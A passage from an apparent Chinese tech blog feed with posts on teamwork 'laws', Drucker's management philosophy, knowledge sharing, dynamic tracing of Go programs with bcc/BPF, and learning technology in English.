该法则的发明者来自音乐产业。新手音乐家注重好听的声音。专业的音乐家首先考虑歌曲的情绪，他们想要传达的情感，然后找出适合它的声音。应用领域：项目管理、目标管理 Dude’s Law, Don Reinertsen and Walmart How does a former musician build a successful business in the agile space? DevJam leads the way with David Hussman 9. Law of 2 Feet If at any time during our time together you find yourself in any situation where you are neither learning nor contributing, use your two feet, go someplace else. 应用领域：组织沟通 Youtube:Online Open Space Technology Meetings Open Space Technology What Is Open Space Technology? 10. Law of Propinquity The probability of two people communicating is inversely proportional to the distance between them.两个人交流的概率与他们之间的距离成反比。数字时代亦然。 Cucumbers get more pickled than brine gets cucumbered.当你进入一个环境，它会更多地影响你而不是相反 the more we see people and interact with them, the more probable we are to like them. Twitter and the law of propinquity Bonus: Prescott’s Pickle Principle 11. Linus’ Law以Linux创始人林纳斯·托瓦兹（Linus Torvalds）的名字来命名，但最先由埃里克·斯蒂芬·雷蒙（Eric S. Raymond）的作品《大教堂和市集》（The Cathedral and the Bazaar）中所提出。“足够多的眼睛，就可让所有问题浮现”（given enough eyeballs, all bugs are shallow）。 应用领域：代码审查。“只要有足够的单元测试员及共同开发者，所有问题都会在很短时间内被发现，而且能够很容易被解决”。将代码展示给更多开发者以达成共识。在2001年出版的《黑客伦理与信息时代的精神》(The Hacker Ethic And the Spirit of th Information Age)里，林纳斯在其为此书做的序言中，自己定义了另外一个林纳斯定律 人类所有的动机可分为递进的三种类型 — 生存（survival）、社会生活（social life）、娱乐（entertainment）。…… “黑客”是已经超越利用计算机谋生存而进入后面两个阶段的人。计算机本身就是娱乐。黑客坚信没有比这更高的动力阶段。 扩展阅读 Linus Torvalds:Just for Fun Linus Torvalds: The mind behind Linux 参考文献 Mental models | Dec 22, 2016]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road To Leader:管理哲学]]></title>
    <url>%2F2017%2F07%2F02%2FManager%2F</url>
    <content type="text"><![CDATA[摘要 彼得·德鲁克论管理哲学 彼得·德鲁克论管理哲学知识必须要不断地改进、质疑和增加，否则它就会消失 每隔3～4年，我都会挑选一个新的学科。可能是日本艺术，也可能是经济学。3年的学习并不足以掌握一个学科的专业知识，但至少能够对它有一个基本的了解。因此，在六十多年的时间里，我一直在坚持不断地系统学习，从一个学科到另一个学科。这不仅让我获得了丰厚的知识储备，也迫使我以开放的眼界面对新的科目、新的路径和新的方法，因为每一个学科都有着不同的假设和不同的方法论。 机构是由一群专业人士组成的。举个例子，某个乐队成员至少都应该了解音乐，要知道作曲家的作品是什么样的，而不仅仅是只知道一个巴松管。你必须要有整体责任意识，要将自己置于一个更大画面中。命令是自上而下的，信息则是自下而上的。（不列颠百科全书奖的获奖致辞，1987） 应用到工作中的知识才是知识工作学界普遍认为知识就是你在学校课堂里学到的东西，但事实并非如此。我们在课堂上获得的是信息，我们希望你具有学习的能力。我们在书本中学到的是学问，而只有你将这种学问应用到工作中时，它才会转变为知识。 如果你的行动会导致外部发生变化，而你自身却未发生任何变化，那么这表明你并没有真正地学到什么。而如果只有你自身发生了变化，那么这表明你并没有真正地运用知识。因此，问题就在于：我们该如何对待那些学有所成的、掌握信息的人？我们又该如何让他们变得高效呢？首先要指出的是，提高计时工人工作效率的方式并不适用于他们。首要一点，如果他们是优秀的人才，那么他们对自己所从事工作的了解程度将远超过老板。其次，教育给予了人们自信心，使之具备了流动能力，从而为个人发展提供了更大的舞台。 我至今仍听到商界的一些朋友谈论忠诚度之类的话题。不要再谈了。接受这样一个现实，那就是你必须要为雇员提供有价值的工作。获取薪水是工作的目的之一，但却非唯一目的。 信息化组织必须是一个开创型组织你该如何去组织呢？事实上，你必须要有一个学科作为基础，同时，你还要了解其他与之相关的外部学科。一个学科是必须的容器，但它只是暂时性的，非常短暂。那么，你该如何去做呢？现在，很多公司已经发现，你 需要的并不是一个精于某一领域的研究负责人，你需要的是一个了解其他诸多领域的技术专家。 你必须要从知识本身是不断变化的这一假定触发————你掌握的知识越多，它的变化就越多。有假定认为，知识本身是一种输入，它必须经过整合才能成为输出。有假定认为知识必须是集中的。如果你将它愤慨，那么你只会得到很少。你得到的是新闻，而不是知识。 变革对你我的意义未来的管理人员一定要打好见识的基础。坦白地讲，我觉得我们现在做得还不够。在我们的高管培训计划中，我发现很多人在基础知识方面都很薄弱。原因有二：一是以为你太过于专业化了。在我们这个国家，大多数人走的是技术路线，也就是说，他们的升迁是靠自己的专业，除非他们做到公司的高层，否则他们不会参与公司的其他业务或管理。就个人而言，这或许是一种优势，但最终他是要付出代价的。 一个人需要最新的知识，但他也需要最基础的知识。对于基础知识，我们从未给予足够重视，我们对它采取了想当然的态度，这显然是错误的。我们要提醒自己，同时也要提醒他人，不管一个神经外科医生的医术有多么高超，他都是从人体解剖学开始学起的。 管理是一种自由艺术在大多数商学院中，管理仍是被作为技巧讲授的，比如说如何做预算，如何促进组织发展。诚然，同其他工作一样，管理也有其自身的工具和技巧，但正如医学的精髓并不是进行尿样分析一样，管理的精髓也不是技巧或程序。管理的精髓是让知识发挥生产性作用。换句话说，管理是一种社会功能。而作为实践，管理是一种真正的自由艺术。 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road To Leader：构建知识共享型团队]]></title>
    <url>%2F2017%2F06%2F27%2FTeamWork-Knowledge-Sharing%2F</url>
    <content type="text"><![CDATA[摘要 一些有趣的知识分享圈子 推荐一些有趣的的电子书 知识分享圈子 知识星球|睿哥读书会（年费制） 知识星球|系统运维专家（免费加入） 知识星球|Machine Learning 小组（免费加入） 知识星球|经济学人翻译社（免费加入） 我的电子书列表 《The Linux Perf Master| 操作系统性能专家》 《The Cyber-Security Master | 网络安全专家》 《The Data Visualization Master | 数据可视化专家》 《The Machine Learning Master | 机器学习专家》 TipsCoffeeDeveloper | 你为什么不分享多写，是有讲究的。特别是对于技术类的文章来说，为什么？因为技术文章是有套路或者说模板可循的。例如：介绍一个新技术 介绍技术名称和大概作用 抛出一个常见的问题 以往的技术是如何解决的 新技术是如何解决的 新技术在解决方案上对比旧技术的优势 新技术存在的问题与不足 展望新技术的发展和提出更多的应用场景 有条件的还可以提供性能测试结果等等，加强说服力 参考文献 热爱阅读的芬兰人 赵亚:我为什么坚持这么多年写博客 Joey Chen:我为什么鼓励工程师写Blog 邱俊涛：技术人员如何写一本书]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪]]></title>
    <url>%2F2017%2F06%2F27%2FDTrace_bcc%2F</url>
    <content type="text"><![CDATA[摘要 原文：Brendan Gregg’s Blog :《Golang bcc/BPF Function Tracing》，31 Jan 2017 引子：gdb、go execution tracer、GODEBUG、gctrace、schedtrace 一、gccgo Function Counting 二、Go gc Function Counting 三、Per-event invocations of a function 四、Interface Arguments 五、Function Latency 六、总结 七、Tips：构建 LLVM 和 Clang 开发工具库 在这篇文章中，我将迅速调研一种跟踪的 Go 程序的新方法：基于 Linux 4.x eBPF 实现动态跟踪。如果你去搜索 Go 和 BPF，你会发现使用 BPF 接口的 Go 语言接口（例如，gobpf）。这不是我所探索的东西：我将使用 BPF 工具实现 Go 应用程序的性能分析和调试。 目前已经有多种调试和追踪 Go 程序的方法，包括但不限于： gdb go execution tracer ：用于高层异常和阻塞事件 Go execution tracer. (import “runtime/trace”)The tracer captures a wide range of execution events like goroutine creation/blocking/unblocking, syscall enter/exit/block, GC-related events, changes of heap size, processor start/stop, etc and writes them to an io.Writer in a compact form. A precise nanosecond-precision timestamp and a stack trace is captured for most events. A trace can be analyzed later with ‘go tool trace’ command. GODEBUG （一个跨平台的Go程序调试工具）、 gctrace 和 schedtrace BPF 追踪以做很多事，但都有自己的优点和缺点，接下来将详细说明。首先我从一个简单的 Go 程序开始（ hello.go） 1234567package mainimport "fmt"func main() &#123; fmt.Println("Hello, BPF!")&#125; 一、gccgo Function Counting我开始会使用 gccgo 编译，然后使用 Go gc 编译器 。（区别：gccgo 可以生成优化后的二进制文件，但是基于老版本的 Go。） 1234## 编译$ gccgo -o hello hello.go$ ./helloHello, BPF! 现在我将使用 bcc 工具的 funccount 来动态跟踪和计数所有以 “fmt.” 开头的 Go 库函数调用，在另一个终端重新运行 Hello 程序效果如下： 123456789101112131415161718192021# funccount 'go:fmt.*'Tracing 160 functions for "go:fmt.*"... Hit Ctrl-C to end.^CFUNC COUNTfmt..import 1fmt.padString.pN7_fmt.fmt 1fmt.fmt_s.pN7_fmt.fmt 1fmt.WriteString.pN10_fmt.buffer 1fmt.free.pN6_fmt.pp 1fmt.fmtString.pN6_fmt.pp 1fmt.doPrint.pN6_fmt.pp 1fmt.init.pN7_fmt.fmt 1fmt.printArg.pN6_fmt.pp 1fmt.WriteByte.pN10_fmt.buffer 1fmt.Println 1fmt.truncate.pN7_fmt.fmt 1fmt.Fprintln 1fmt.$nested1 1fmt.newPrinter 1fmt.clearflags.pN7_fmt.fmt 2Detaching... Neat! 输出结果中包含该程序的 fmt.Println() 函数调用。 我不需要进入任何特殊的模式才能实现这个效果，对于一个已经在运行的 Go 应用我可以直接开始测量而不需要重启进程。 So how does it even work? 这要归功于 uprobes ，Linux 3.5 新增的特性，详见Linux uprobes: User-Level Dynamic Tracing 。 It overwrites instructions with a soft interrupt to kernel instrumentation, and reverses the process when tracing has ended. gccgo 编译的输出提供一个标准的符号表用于函数查找。在这种情况下，我利用 libgo 当测量工具（假定“lib”在“go:”之前），作为 gccgo 发出的一个二进制动态链接库（libgo 包含 fmt 包）。uprobes 可以连接到已经运行的进程，或者像我现在一样作为一个二进制库，捕捉所有调用自己的进程。 为了提高效率，我在内核上下文中进行函数调用计数，只将计数发送到用户空间。例如： 1234567891011121314151617$ file hellohello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4dc45f1eb023f44ddb32c15bbe0fb4f933e61815, not stripped$ ls -lh hello-rwxr-xr-x 1 bgregg root 29K Jan 12 21:18 hello$ ldd hello linux-vdso.so.1 =&gt; (0x00007ffc4cb1a000) libgo.so.9 =&gt; /usr/lib/x86_64-linux-gnu/libgo.so.9 (0x00007f25f2407000) libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f25f21f1000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f25f1e27000) /lib64/ld-linux-x86-64.so.2 (0x0000560b44960000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f25f1c0a000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f25f1901000)$ objdump -tT /usr/lib/x86_64-linux-gnu/libgo.so.9 | grep fmt.Println0000000001221070 g O .data.rel.ro 0000000000000008 fmt.Println$descriptor0000000000978090 g F .text 0000000000000075 fmt.Println0000000001221070 g DO .data.rel.ro 0000000000000008 Base fmt.Println$descriptor0000000000978090 g DF .text 0000000000000075 Base fmt.Println 这些内容看起来非常像一个编译过的 C 语言二进制程序，因此可以使用包括 bcc/BPF在内的许多现有的调试工具和追踪器观测。相对于测量即时编译的运行时要简单得多（例如 Java 和 Node.js）。到目前为止，这个例子唯一的麻烦事函数名称中可能包含非标准的字符，例如“.”。 funccount also has options like -p to match a PID, and -i to emit output every interval. It currently can only handle up to 1000 probes at a time, so “fmt.*“ was ok, but matching everything in libgo: funccount 提供 -p 选项来匹配进程号（PID），-i 选项来控制输出频率。它目前能够同时处理 1000 个探测点，匹配 “fmt.*” 时运行正常，但是匹配 libgo 的所有函数就出现异常。诸如此类的问题在 bcc/BPF 中还有不少，我们需要寻找其它的方法来处理。 12# funccount 'go:*'maximum of 1000 probes allowed, attempted 21178 二、Go gc Function Counting使用 Go 语言的 gc 编译器实现 fmt 函数调用计数： 123$ go build hello.go$ ./helloHello, BPF! 123456789101112131415161718# funccount '/home/bgregg/hello:fmt.*'Tracing 78 functions for "/home/bgregg/hello:fmt.*"... Hit Ctrl-C to end.^CFUNC COUNTfmt.init.1 1fmt.(*fmt).padString 1fmt.(*fmt).truncate 1fmt.(*fmt).fmt_s 1fmt.newPrinter 1fmt.(*pp).free 1fmt.Fprintln 1fmt.Println 1fmt.(*pp).fmtString 1fmt.(*pp).printArg 1fmt.(*pp).doPrint 1fmt.glob.func1 1fmt.init 1Detaching... 你依然能够追踪到 fmt.Println() ，这个二进制程序与 libgo 有所不同：包含该函数的是一个 2M 的静态库（而非动态库的 29K ）。另一个区别就是函数名称包含更多特殊字符，例如 “*“, “(“,等等，我怀疑如果不能修正处理的haul将影响其它调试器（例如 bcc 追踪器）。 12345678$ file hellohello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped$ ls -lh hello-rwxr-xr-x 1 bgregg root 2.2M Jan 12 05:16 hello$ ldd hello not a dynamic executable$ objdump -t hello | grep fmt.Println000000000045a680 g F .text 00000000000000e0 fmt.Println 三、Per-event invocations of a function3.1 gccgo Function Tracing现在我将尝试使用 Sasha Goldshtein 的追踪工具，也是基于 bcc，用来查看每一个函数调用事件。我将回到 gccgo，使用一个非常简单的示例程序（ from the go tour ），functions.go: 1234567891011package mainimport "fmt"func add(x int, y int) int &#123; return x + y&#125;func main() &#123; fmt.Println(add(42, 13))&#125; 追踪 add() 函数。所有参数都输出在右侧，trace 还有其他选项（帮助 -h ），例如输出时间戳和堆栈。 123456789\# trace '/home/bgregg/functions:main.add'PID TID COMM FUNC 14424 14424 functions main.add #... and with both its arguments:\# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'PID TID COMM FUNC -14390 14390 functions main.add 42 13 3.2 Go gc Function Tracing同样的程序，如果使用 go build 就没有 main.add() ? 禁用代码嵌入（ Disabling inlining）即可。 1234567$ go build functions.go# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'could not determine address of symbol main.add$ objdump -t functions | grep main.add$ 1234567$ go build -gcflags '-l' functions.go$ objdump -t functions | grep main.add0000000000401000 g F .text 0000000000000020 main.add# trace '/home/bgregg/functions:main.add "%d %d" arg1, arg2'PID TID COMM FUNC -16061 16061 functions main.add 536912504 16 That’s wrong. 参数应该是 42 和 13 而不是 536912504 和 16。使用 gdb 查看结果如下： 12345678910111213141516171819202122232425262728293031323334353637383940$ gdb ./functions[...]warning: File "/usr/share/go-1.6/src/runtime/runtime-gdb.py" auto-loading has been declined by your 'auto-load safe-path' set to "$debugdir:$datadir/auto-load".[...](gdb) b main.addBreakpoint 1 at 0x401000: file /home/bgregg/functions.go, line 6.(gdb) rStarting program: /home/bgregg/functions[New LWP 16082][New LWP 16083][New LWP 16084]Thread 1 "functions" hit Breakpoint 1, main.add (x=42, y=13, ~r2=4300314240) at /home/bgregg/functions.go:66 return x + y(gdb) i rrax 0xc820000180 859530330496rbx 0x584ea0 5787296rcx 0xc820000180 859530330496rdx 0xc82005a048 859530698824rsi 0x10 16rdi 0xc82000a2a0 859530371744rbp 0x0 0x0rsp 0xc82003fed0 0xc82003fed0r8 0x41 65r9 0x41 65r10 0x4d8ba0 5082016r11 0x0 0r12 0x10 16r13 0x52a3c4 5415876r14 0xa 10r15 0x8 8rip 0x401000 0x401000eflags 0x206 [ PF IF ]cs 0xe033 57395ss 0xe02b 57387ds 0x0 0es 0x0 0fs 0x0 0gs 0x0 0 启动信息中包含一个关于 runtime-gdb.py 的警告，它非常有用：如果需要进一步深入挖掘 Go 上下文，我希望能够修复并找出告警原因。即使没有该信息，gdb 依然可以输出参数变量的值是 “x=42, y=13”。我也将它们从寄存器导出与 x86_64 ABI（Application Binary Interface，应用程序二进制接口）对比，which is how bcc’s trace reads them. From the syscall(2) man page: 1234 arch/ABI arg1 arg2 arg3 arg4 arg5 arg6 arg7 Notes ──────────────────────────────────────────────────────────────────[...] x86_64 rdi rsi rdx r10 r8 r9 - The reason is that Go’s gc compiler is not following the standard AMD64 ABI function calling convention, which causes problems with this and other debuggers. 42 和 13 没有出现在 rdi , rsi 或者其它任何一个寄存器。原因是 Go 的 gc 编译器不遵循标准的 AMD64 ABI 函数调用约定，其它调试器也会存在这个问题。这很烦人。我猜 Go 语言的返回值使用的是另外一种 ABI，因为它可以返回多个值，所以即使入口参数是标准的，我们仍然会遇到差异。我浏览了指南（Quick Guide to Go’s Assembler and the Plan 9 assembly manual），看起来函数在堆栈上传递。这些是我们的 42 和 13： 123(gdb) x/3dg $rsp0xc82003fed0: 4198477 420xc82003fee0: 13 BPF can dig these out too. As a proof of concept, I just hacked in a couple of new aliases, “go1” and “go2” for those entry arguments: BPF 也可以挖掘这些信息。为了验证这一个概念，我为入口参数声明一对新的别名“go1”和“go2” 。希望您阅读本文的时候，我（或者其他人）已经将它加入到 bcc 追踪工具中，最好是 “goarg1”, “goarg2”, 等等。 123# trace '/home/bgregg/functions:main.add "%d %d" go1, go2'PID TID COMM FUNC -17555 17555 functions main.add 42 13 四、Interface Arguments你可以写一个自定义的 bcc/BPF 程序来挖掘，为了处理接口参数我们可以给 bcc 的跟踪程序添加多个别名。输入参数是接口的示例： 12func Println(a ...interface&#123;&#125;) (n int, err error) &#123; return Fprintln(os.Stdout, a...) 123456789101112131415161718192021$ gdb ./hello[...](gdb) b fmt.PrintlnBreakpoint 1 at 0x401c50(gdb) rStarting program: /home/bgregg/hello[Thread debugging using libthread_db enabled]Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".[New Thread 0x7ffff449c700 (LWP 16836)][New Thread 0x7ffff3098700 (LWP 16837)][Switching to Thread 0x7ffff3098700 (LWP 16837)]Thread 3 "hello" hit Breakpoint 1, fmt.Println (a=...) at ../../../src/libgo/go/fmt/print.go:263263 ../../../src/libgo/go/fmt/print.go: No such file or directory.(gdb) p a$1 = &#123;__values = 0xc208000240, __count = 1, __capacity = 1&#125;(gdb) p a.__values$18 = (struct &#123;...&#125; *) 0xc208000240(gdb) p a.__values[0]$20 = &#123;__type_descriptor = 0x4037c0 &lt;__go_tdn_string&gt;, __object = 0xc208000210&#125;(gdb) x/s *0xc2080002100x403483: "Hello, BPF!" 五、Function Latency 示例：循环调用 fmt.Println() 函数的时延直方图（纳秒） WARNING: Go 函数调用过程中，如果从一个进程（goroutine）切换到另外一个系统进程，funclatency 无法匹配入口-返回。这种场景需要一个新的工具 —— gofunclatency ，它基于 Go 内建的 GOID 替代系统的 TID 追踪时延，在某些情况下， uretprobes 修改 Go 程序可能出现崩溃的问题，因此在调试之前需要准备周全的计划。 123456789101112131415161718192021# funclatency 'go:fmt.Println'Tracing 1 functions for "go:fmt.Println"... Hit Ctrl-C to end.Function = fmt.Println [3041] nsecs : count distribution 0 -&gt; 1 : 0 | | 2 -&gt; 3 : 0 | | 4 -&gt; 7 : 0 | | 8 -&gt; 15 : 0 | | 16 -&gt; 31 : 0 | | 32 -&gt; 63 : 0 | | 64 -&gt; 127 : 0 | | 128 -&gt; 255 : 0 | | 256 -&gt; 511 : 0 | | 512 -&gt; 1023 : 0 | | 1024 -&gt; 2047 : 0 | | 2048 -&gt; 4095 : 0 | | 4096 -&gt; 8191 : 0 | | 8192 -&gt; 16383 : 27 |****************************************| 16384 -&gt; 32767 : 3 |**** |Detaching... 六、总结原作者总结很简洁，不再赘述。 I took a quick look at Golang with dynamic tracing and Linux enhanced BPF, via bcc’s funccount and trace tools, with some successes and some challenges. Counting function calls works already. Tracing function arguments when compiled with gccgo also works, whereas Go’s gc compiler doesn’t follow the standard ABI calling convention, so the tools need to be updated to support this. As a proof of concept I modified the bcc trace tool to show it could be done, but that feature needs to be coded properly and integrated. Processing interface objects will also be a challenge, and multi-return values, again, areas where we can improve the tools to make this easier, as well as add macros to C for writing other custom Go observability tools as well. 七、Tips6.1 安装和编译 BCC123456789101112git clone https://github.com/iovisor/bcc.gitmkdir bcc/build; cd bcc/buildcmake -DCMAKE_INSTALL_PREFIX=/usr \ -DLUAJIT_INCLUDE_DIR=`pkg-config --variable=includedir luajit` \ # for lua support ..makesudo make installcmake -DPYTHON_CMD=python3 .. # build python3 bindingpushd src/python/makesudo make installpopd 6.2 构建 LLVM 和 Clang 开发工具库1234567891011121314151617181920yum install gccyum install gcc-g++wget https://cmake.org/files/v3.9/cmake-3.9.0-rc4.tar.gztar -xvf cmake-3.9.0-rc4.tar.gzcd cmake-3.9.0./bootstrap gmakegmake installexport CMAKE_ROOT=/usr/local/share/cmake-3.9.0export PATH=$PATH:$CMAKE_ROOTgit clone http://llvm.org/git/llvm.gitcd llvm/tools;git clone http://llvm.org/git/clang.gitcd ..; mkdir -p build/install; cd buildcmake -G \"Unix Makefiles\" -DLLVM_TARGETS_TO_BUILD=\"BPF;X86\" -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=$PWD/install ..makemake installexport PATH=$PWD/install/bin:$PATH 6.3 LLVM 与 ClangLLVM （Low Level Virtual Machine）是一种编译器基础设施，以C++写成。起源于2000年伊利诺伊大学厄巴纳-香槟分校维克拉姆·艾夫（Vikram Adve）与克里斯·拉特纳（Chris Lattner）的研究，他们想要为所有静态及动态语言创造出动态的编译技术。2005年，Apple直接雇用了克里斯·拉特纳及他的团队，为了苹果电脑开发应用程序，期间克里斯·拉特纳设计发明了 Swift 语言，LLVM 成为 Mac OS X 及 iOS 开发工具的一部分。LLVM 的范围早已经不局限于创建一个虚拟机，成为了众多编译工具及低级工具技术的统称，适用于LLVM下的所有项目，包含LLVM中介码（LLVM IR）、LLVM除错工具、LLVM C++标准库等。 目前 LLVM 已支持包括ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Rust、Scala1以及C#等语言。 Clang 是LLVM编译器工具集的前端（front-end），目的是输出代码对应的抽象语法树（Abstract Syntax Tree, AST），并将代码编译成LLVM Bitcode。接着在后端（back-end）使用 LLVM 编译成平台相关的机器语言 。Clang支持C、C++、Objective C。它的目标是提供一个 GCC 的替代品。作者是克里斯·拉特纳（Chris Lattner），在苹果公司的赞助支持下进行开发。Clang项目包括Clang前端和Clang静态分析器等。 6.4 ABI应用二进制接口（Application Binary Interface， ABI）描述了应用程序和操作系统之间或其他应用程序的低级接口。ABI涵盖了各种细节，如： 数据类型的大小、布局; 调用约定（控制着函数的参数如何传送以及如何接受返回值），例如，是所有的参数都通过栈传递，还是部分参数通过寄存器传递；哪个寄存器用于哪个函数参数；通过栈传递的第一个函数参数是最先push到栈上还是最后； 目标文件的二进制格式、程序库等等。 ABI vs API应用程序接口 (API)定义了源代码和库之间的接口，因此同样的代码可以在支持这个API的任何系统中编译，然而ABI允许编译好的目标代码在使用兼容 ABI 的系统中无需改动就能运行。 扩展阅读动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Linux MySQL Slow Query Tracing with bcc/BPF | Brendan Gregg’s Blog Notes on BPF &amp; eBPF | Julia Evans Probing the JVM with BPF/BCC | Sasha BPF: Tracing and more | Brendan Gregg SlideShare Using Causal Profiling to Optimize the Go HTTP/2 Server]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工程师的自我修养：全英文技术学习实践]]></title>
    <url>%2F2017%2F06%2F27%2FTechnology-English%2F</url>
    <content type="text"><![CDATA[概要 O’Reilly之所以能够负担起Perl和Apache领导人的薪水，是因为预期他们的工作能够让公司出售更多Perl和Apache相关的书籍，并吸引更多人参加其会议。– 《大教堂与集市》 全英文技术学习的必要性 如何实践全英文技术学习 一、搞一点翻译 二、精读原版教材 三、电子书必不可少 四、一切知识最后都要对应到人 五、善用效率工具，持续改进 总结：从input到output 引子2016年9月，上海GOPS大会现场。《Site Reliability Engineering》一书的作者之一、来自Google的Chris Jones在做分享, Chris说一句，他的前同事、中文版译者孙宇聪在一旁翻译一句。演讲人和翻译一句一顿，底下上千人坐着，像极了总理新闻发布会，场面一度尴尬。link 可是话说回来了，要是不翻译，估计现场80%以上的人还真就听不明白在说啥，公开活动毕竟要照顾大多数。 本篇文章接下来将结合挨踢行业的一些情况，严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。 全英文技术学习的必要性现实一：中国英文教育的全面失败一般接受过小学教育的人都可以掌握中文，在日常生活中熟练应用：可以拿起一份报纸或者打开一个八卦网页看得津津有味。而反观我们的英文教育可以说是彻头彻尾的失败——投资巨大（据说很多城市中产阶级报的英语补习班，每学期学费约2.5万元）、旷日持久（完成本科教育也至少10几年吧），却少有人可以随便拿起一份英文报纸或者杂志看的津津有味。 本朝还有一大特色就是所谓的“专业英语”，几乎每个专业都安排了一个“XX专业英语”，列入课程、列入考试、列入职称评定等等。网上搜了一下，目前大概有100多种，实际效果如何呢？我想除了增加教材销售额，对相关从业人员的水平提高不会有什么用。 现实二：中文出版市场的怪象根据有关调查数据，国民人均阅读图书4.25本（加上电子书就有5.77本了）。下列国家每年人均阅读的数量是：韩国11本、法国20本、日本40本、芬兰47本，以色列64本。这个调查数字不是非常权威，但是可以在出版市场获得验证：虽然我们是一个13亿人的国家，一年出版的图书中接近70%属于服务考试的教材，全国一年中销售过百万册的文艺类畅销书也不到10种，专业技术书籍就只能算非常小众的市场了。相关数据和生活观察都可以发现，很多人在接受完基础教育之后，基本上就不再看书了。 以IT行业为例，一本普通的专业技术书籍，销量和利润大概是多少呢？保本：销售3000本以上畅销书：销售几万本以上大畅销书：销售几十万本以上超级畅销书：销售一百万本以上 对比文艺类书籍，专业书籍是垂直市场、受众人群少、销量小。大部分（50%以上）的IT书籍，销售量不超过3000本，只能刚刚弥补纸张、印刷、作者、编辑的成本，对出版社来说，毫无利润。 中文作者的报酬出版社给作者的版税是8%，现在一本书定价大约为50～100元，卖一本书作者到手4～8块，保本销售才到手12000～24000元，北上广稍微资深一点的码农月薪一般都比这个高，有写书的功夫还不都玩去了。翻译译者的报酬就更低了，已经十多年没有变了（耗时数月，斟酌字句：千字60元RMB)，所以技术书籍的译者，基本上是在为人民服务、跟做公益差不多。 中文出版市场恶性循环由此形成：需求畸形导致供应畸形，大部分人都去搞门槛低、利润高的考试教辅市场，其它作／译者能获得的报酬过低，报酬低又消灭高水平人士进入的热情，进一步限制了出版作品的质量，更没法吸引读者。 现状三：中文对学术的贡献度低如果前面两个问题还可以通过 国民教育改革 、知识产权制度建设 以及国内相关产业的技术提升而逐步改善，那么国人原创能力和动力不足的现实问题更加突出：互联网上有英语使用者9.5亿，中文网民7.6亿紧随其后，这个数量远远超过排名第三、只有2.9亿使用者的西班牙语网民。但是互联网的资讯数量，英语信息占到51.7%，紧随其后的俄语和日语信息，分别是6.5%和5.6%。中文排名一下子落到了第九位，只占整个互联网信息总量的2%，甚至还逊于2.5%的葡萄牙语、2.4%的意大利语。 上述数据显示：使用中文的人更喜欢浏览网络上的资讯，但对创作新的内容并不感兴趣。这一点亦可以在微信朋友圈上得到印证：大多数人习于转发，习惯于转述流行的热帖，而有一定创作能力或者说表达自己观点的人，可以说是凤毛麟角。 如何实践全英文技术学习了解上述三个现状，就可以发现这些问题都不是依靠几个宏伟命题、高喊几句口号可以在短期内根本改善的。那么作为一名有追求的工程师，该如何突破这些瓶颈，提高自己的长远竞争力呢？———— 全英文技术学习训练。接下来将我最近一段时间的训练总结如下，供各位读者交流、批判。 一、搞一点翻译关于全英文技术学习的思路，我是从业余翻译活动中获得的灵感。最早翻译的内容也不是技术方面，而是经济学人上面的文章：跟技术沾点边，又比较有趣的小短文。这样的文章，对于它的背景会比较熟悉，又不至于耗费太多精力，例如： Economist译文:事与愿违的后门程序 Economist译文:印度电商竞赛 体会到翻译的乐趣之后，我才开始寻找一些本专业的英文资料，翻译之后发在社区，取得了不错的反馈，例如： 《Stack Overflow: The Architecture - 2016 Edition》 动态追踪技术：Linux喜迎DTrace Linux之父：Just for Fun！ 翻译的过程其实就是对原文知识的再强化、再巩固的过程，译的过程中任何混淆不清的地方都需要反复揣摩、查阅第三方资料求证，直到译完之后就会发现，对比刚开始粗粗阅览的时候已经有了更深刻的理解。但是 搞一点翻译最重要的心得就是：翻译根本靠不住！ 我首先承认：由于水平有限，之前以及往后发布的翻译作品肯定会有错误、疏漏，或者不得已“模糊”处理的地方。有些东西实在很难找到合适的中文表达方式，或者说译者对于原文也会有不明白、理解错误的地方，自己尚且如此，何况其他译者乎？ 现实中很多人完全依赖翻译资料学习技术，这种侥幸心理实在过于乐观。 另外，据我所知国内有些技术Leader，都有 带领团队翻译书籍 的习惯。翻译是最适合团队合作的游戏之一，既能提高大家的学习能力、表达能力，又能训练团队密切协作，这是多Cool的事啊！以后有机会专门写篇讨论下。 二、精读原版教材对于计算机专业，或者对于经济、金融、卫生、法律、管理等专业来说也一样，本来中文语境下就没有这类专业，纯属舶来品，用英文去学习和理解反而更加简单。在大量的英文资料中，大致可以分为如下几类： 专业领域术语。最省事最高效的方法就是上维基百科把每个词都查一遍。 HandBook。 经典教材 经典论文。广义上还包括各种RFC文件 发明者的论述&amp;培训讲义 